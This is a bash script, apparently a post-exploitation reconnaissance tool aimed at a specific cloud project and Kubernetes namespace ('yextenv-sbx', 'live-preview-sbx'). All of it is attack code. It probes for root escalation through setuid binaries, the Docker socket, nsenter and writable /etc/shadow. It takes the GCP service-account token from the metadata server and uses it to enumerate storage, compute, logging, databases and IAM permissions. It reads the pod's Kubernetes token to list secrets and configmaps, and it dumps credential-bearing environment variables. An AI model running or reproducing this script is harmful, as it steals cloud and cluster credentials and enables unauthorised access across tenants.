#!/bin/bash
echo "=== IDENTITY ==="; id; hostname; date -u; uname -a
echo "=== ROOT ESCALATION ==="
echo "-- sudo check --"; sudo -n id 2>&1
echo "-- setuid binaries --"; find / -perm -4000 -type f 2>/dev/null | head -20
echo "-- capabilities --"; cat /proc/self/status 2>/dev/null | grep -i cap
echo "-- capsh --"; capsh --print 2>/dev/null | head -15
echo "-- docker socket --"; ls -la /var/run/docker.sock 2>&1
echo "-- mount info --"; mount | head -20
echo "-- /proc/1/cgroup --"; cat /proc/1/cgroup 2>/dev/null | head -10
echo "-- writable sensitive paths --"
for p in /etc/passwd /etc/shadow /root /proc/sysrq-trigger; do test -w "$p" && echo "WRITABLE: $p"; done
echo "-- nsenter --"; nsenter --target 1 --mount --uts --ipc --net --pid -- id 2>&1
echo "-- chroot --"; ls /proc/1/root/ 2>&1 | head -5

echo "=== GCP METADATA ==="
MD="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"
TOKENJSON=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token")
TOKEN=$(echo "$TOKENJSON" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
echo "token_len: ${#TOKEN}"
echo "email: $(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/email")"
echo "scopes: $(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/scopes")"
echo "project: $(curl -s -m 5 -H "$MH" "$MD/project/project-id")"
echo "project_num: $(curl -s -m 5 -H "$MH" "$MD/project/numeric-project-id")"
echo "zone: $(curl -s -m 5 -H "$MH" "$MD/instance/zone")"
echo "instance_name: $(curl -s -m 5 -H "$MH" "$MD/instance/name")"
echo "machine_type: $(curl -s -m 5 -H "$MH" "$MD/instance/machine-type")"
echo "-- cluster metadata --"
curl -s -m 5 -H "$MH" "$MD/instance/attributes/cluster-name" 2>&1; echo
curl -s -m 5 -H "$MH" "$MD/instance/attributes/cluster-location" 2>&1; echo
echo "-- all SA aliases --"
curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/" 2>&1; echo
echo "-- kube-env --"
curl -s -m 5 -H "$MH" "$MD/instance/attributes/kube-env" 2>&1 | head -c 2000; echo

echo "=== GCP TOKEN INFO ==="
curl -s -m 8 "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" 2>&1 | head -c 1500; echo

if [ -n "$TOKEN" ]; then
echo "=== GCP: GCS Buckets ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=yextenv-sbx&maxResults=3" 2>&1 | head -c 1500; echo
echo "=== GCP: Compute ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/yextenv-sbx/zones/us-east4-a/instances?maxResults=3" 2>&1 | head -c 1500; echo
echo "=== GCP: GKE Clusters ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://container.googleapis.com/v1/projects/yextenv-sbx/locations/-/clusters" 2>&1 | head -c 1500; echo
echo "=== GCP: IAM testPerms ==="
curl -s -m 8 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/yextenv-sbx:testIamPermissions" -d '{"permissions":["compute.instances.list","storage.buckets.list","container.clusters.list","iam.serviceAccounts.list","logging.logEntries.list","pubsub.topics.list","bigquery.datasets.list","artifactregistry.repositories.list"]}' 2>&1 | head -c 1500; echo
echo "=== GCP: Logging ==="
curl -s -m 8 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://logging.googleapis.com/v2/entries:list" -d '{"resourceNames":["projects/yextenv-sbx"],"pageSize":2}' 2>&1 | head -c 1500; echo
echo "=== GCP: Monitoring ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://monitoring.googleapis.com/v3/projects/yextenv-sbx/metricDescriptors?pageSize=3" 2>&1 | head -c 1500; echo
echo "=== GCP: PubSub ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://pubsub.googleapis.com/v1/projects/yextenv-sbx/topics?pageSize=3" 2>&1 | head -c 1500; echo
echo "=== GCP: BigQuery ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/datasets?maxResults=3" 2>&1 | head -c 1500; echo
echo "=== GCP: Artifact Registry ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://artifactregistry.googleapis.com/v1/projects/yextenv-sbx/locations/-/repositories?pageSize=3" 2>&1 | head -c 1500; echo
echo "=== GCP: Cloud SQL ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://sqladmin.googleapis.com/v1/projects/yextenv-sbx/instances?maxResults=3" 2>&1 | head -c 1500; echo
echo "=== GCP: Cloud Functions ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://cloudfunctions.googleapis.com/v2/projects/yextenv-sbx/locations/-/functions?pageSize=3" 2>&1 | head -c 1500; echo
echo "=== GCP: Cloud Run ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://run.googleapis.com/v2/projects/yextenv-sbx/locations/-/services?pageSize=3" 2>&1 | head -c 1500; echo
echo "=== GCP: Firestore ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://firestore.googleapis.com/v1/projects/yextenv-sbx/databases" 2>&1 | head -c 1000; echo
fi

echo "=== K8S ==="
K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "namespace: $NS"
echo "-- cluster version --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/version" 2>&1; echo
echo "-- SelfSubjectRulesReview --"
curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"live-preview-sbx"}}' 2>&1 | head -c 3000; echo
echo "-- pods --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/pods?limit=5" 2>&1 | head -c 1500; echo
echo "-- services --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/services?limit=5" 2>&1 | head -c 1500; echo
echo "-- configmaps --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/configmaps?limit=3" 2>&1 | head -c 1500; echo
echo "-- secrets --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets?limit=3" 2>&1 | head -c 1500; echo
echo "-- namespaces --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces" 2>&1 | head -c 1500; echo
echo "-- nodes --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/nodes?limit=3" 2>&1 | head -c 1500; echo
echo "-- API discovery --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/apis" 2>&1 | head -c 2000; echo

echo "=== CROSS-TENANT ==="
env | grep LIVE_PREVIEW_ | grep SERVICE_HOST | sort
echo "=== ENV CREDS ==="
env | grep -iE 'YEXT_|SECRET|KEY|TOKEN|PASS|CRED|AUTH' | grep -v K8S | sort
echo "=== NETWORK ==="
cat /etc/resolv.conf 2>/dev/null
echo "-- iptables --"; iptables -L 2>&1 | head -5
echo "=== DONE ==="
